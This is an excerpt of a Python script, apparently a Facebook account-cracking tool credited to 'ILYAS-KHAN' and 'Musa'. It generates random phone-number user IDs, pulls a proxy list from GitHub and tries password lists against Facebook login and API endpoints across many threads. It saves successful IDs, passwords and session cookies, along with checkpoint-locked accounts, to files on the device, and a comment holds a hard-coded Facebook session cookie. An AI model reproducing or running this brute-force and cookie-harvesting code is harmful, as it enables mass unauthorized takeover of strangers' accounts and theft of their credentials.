...
usr=[]
try:
	xd=requests.get('https://github.com/FADII143/Musa-XD/blob/main/proxy.txt').text.splitlines()
	for us in xd:
		usr.append(us)
except: pass
pyt=('python3.11')
...
|_  $$_/| $$  |  $$   /$$//$$__  $$ /$$__  $$
  ...
  | $$  | $$      | $$   | $$  | $$ /$$  \ $$
 /$$$$$$| $$$$$$$$| $$   | $$  | $$|  $$$$$$/
|______/|________/|__/   |__/  |__/ \______/                                       

\x1b[1;91m---------------------------------------
\x1b[1;97m> Author : ILYAS-KHAN-[KHILJI]
\x1b[1;97m> Github : https://github.com ILYAS-KHAN-IK
\x1b[1;97m> Facebok: 
...
while key == 'ILYAS':
    ...
    if username == CorrectUsername:
            print(f'\033[1;37m-----------------------------------------------\n\033[0;97m[•]\033[1;32m LOGGED IN ILYAS-KHANTOOL SUCCESSFULLY') 
            time.sleep(1)
            clear()
            key = 'false'"""
...
def auto_file(cookies,access_token):
    ...
    print('\n \033[1;35m /sdcard/Musa.txt \033[0;97m\n')
...
def group():
    ...
    print(' [\033[1;32m3\033[97;1m] SUBSCRIBE-chanell')
    print(' [\033[1;32m0\033[97;1m] \033[1;31mBack Main Menu');line()
    Musa=input(' [•] Choose : ')
    if Musa == '1':
        os.system('xdg-open https://wa.me/+923427941197?text=')
        menu()
    if Musa == '2':
        os.system('xdg-open https://youtube.com/@ILYAS_II?si=rIP7M3o7JuX92C8b');menu()
    if Musa == '3':
        os.system('xdg-open https://facebook.com');menu()
    if Musa == '0':
        menu()
    else:
...
def pak():
                ...
                try:
                        limit = int(input('\x1b[1;92m Example : 1000, 2000, 3000, 5000, 10000\n\033[1;37m Put Limit : '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=30) as Musa:     
                        clear()
              #  print(' Do You Went Show Cookies :? (Y/n): ')
                        #line()
                      #  cx=input(' Choose : ')
...
def gmail():
                ...
                clear()
                print('\033[1;37m Example: aania, ali, Musa, zahra\033[1;97m')
                line()
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mILYSS\x1b[1;92m-\x1b[1;92mXD\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                ...
                for fikr in passlist:
                       ...
                       # strike = F2() + USX()
                        ...
                        if "c_user" in fadi:
                                ...
                                print('\r\r\033[1;32m [ILYAS-OK] %s | %s'%(ids,pas))
                                print('\033[1;37m [🍪] Cookies :- '+cookies)
                               # cek_apk(session,coki)
                                open('/sdcard/ILYAS/ILYAS-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/ILYAS/ILYAS-OK-COOKiE.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
                              
                                oks.append(ids)
                                break
                        elif 'checkpoint' in fadi:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [ILYAS-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ILYAS-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api1(ids,names,passlist):
	try:
		...
		sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mILYAS\x1b[1;92m-\x1b[1;92mXD\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()	
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
		...
		for pw in passlist:
			...
			if 'session_key' in po:
				uid = str(po['uid'])
				print('\r\r\033[1;32m [Ilyas-OK] '+uid+' | '+pas+'|'+asha(uid)+'\033[1;32m')                                
				ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
				ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
				cookies = f"sb={ssbb};{ckkk}"
				print('\033[1;37m [🍪] Cookies :- '+cookies)
				#cek_apk(session,coki)
				open('/sdcard/ilyas/Ilyas-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')
				oks.append(uid)
				break
			elif 'www.facebook.com' in po['error']['message']:
				uid = str(po['error']['error_data']['uid'])
				#print(f'\r\r\033[1;33m [Musa-CP] '+uid+' | '+pas+'\033[1;97m')
				open('/sdcard/Musa/Musa-CP.txt','a').write(uid+'|'+pas+'\n')
				cps.append(uid)
				break
			else:
				continue
...
def rd(ids,passlist):
	try:
		...
		sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mMusa\x1b[1;92m-\x1b[1;92mXD\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()		
		for pas in passlist:                                          
		...
		#	rand = None
			...
			if 'session_key' in po:
				uid = str(po['uid'])                                  
				#print('\r\r\033[1;32m [Ilyas-OK] '+uid+' | '+pas+' | '+asha(uid)+'\033[1;32m')                                                                                          
				print('\r\r\033[1;32m [Ilyas-OK] '+uid+' | '+pas+'\033[1;32m')                                                                                          
				ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
				ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
				cookies = f"sb={ssbb};{ckkk}"
				if 'y' in cookie:
				 print('\033[1;37m [🍪] Cookies :- '+cookies)                                                                                                                                                
				#cek_apk(session,coki)
				open('/sdcard/Ilyas/Ilyas-R-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')                                                          
				oks.append(uid)
###                                
				break
			elif 'www.facebook.com' in po['error']['message']:                                
				uid = str(po['error']['error_data']['uid'])
				print(f'\r\r\033[1;33m [Musa-CP] '+uid+' | '+pas+'\033[1;97m')
				open('/sdcard/Musa/Musa-R-CP.txt','a').write(uid+'|'+pas+'\n')
				cps.append(uid)
				break
			else:
				continue
...
def bd1(ids,passlist):
    ...
    # 'cookie': 'datr=P9cyZf4j-8G7IHD--tCFhkhO; sb=P9cyZSMZrDOxIwrYNvgofCme; locale=en_US; vpd=v1%3B724x384x1.875; m_pixel_ratio=1.875; wl_cbv=v2%3Bclient_version%3A2338%3Btimestamp%3A1697989613; wd=384x724; fr=0Y19KNuVl3iwXkPmJ.AWUOTbeStgvRmUDDsviMyRezPq8.BlMtc_.AV.AAA.0.0.BlNUP_.AWWv5iqNt2U',
    'dpr': '1.875',
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m [Ilyas-OK] '+ids+' | '+ps)                
                print('\033[1;37m [🍪] Cookies :- '+coki)                
                open('/sdcard/ilyas/ILYAS-BD-OK.txt', 'a').write( ids+' | '+ps+' | '+coki+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print(f'\r\r\033[1;33m [Ilyas-CP] '+ids+' | '+ps+'\033[1;97m')
                open('/sdcard/Musa-BD-CP.txt', 'a').write( ids+' | '+ps+' \n')
                cps.append(cid)
            elif twf in session.cookies.get_dict().keys():
                print('\033[1;93m\033[0;34mMusa-2F '+ids+' • '+ps+'  \033[0;97m')
                break
            else:
                continue
        loop+=1
	...
	try:
		...
		for pw in passlist:
			...
			if 'session_key' in po:
				...
				cookies = f"sb={ssbb};{ckkk}"
				print('\033[1;37m [🍪] Cookies :- '+cookies)
				open('/sdcard/ilyas/Musa/Ilyas-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')
				oks.append(uid)
				break
			elif 'www.facebook.com' in po['error']['message']:
				uid = str(po['error']['error_data']['uid'])
				#print(f'\r\r\033[1;33m [ILYAS-CP] '+uid+' | '+pas+'\033[1;97m')
				open('/sdcard/ILYAS-CP.txt','a').write(uid+'|'+pas+'\n')
				cps.append(uid)
				break
			else:
				continue
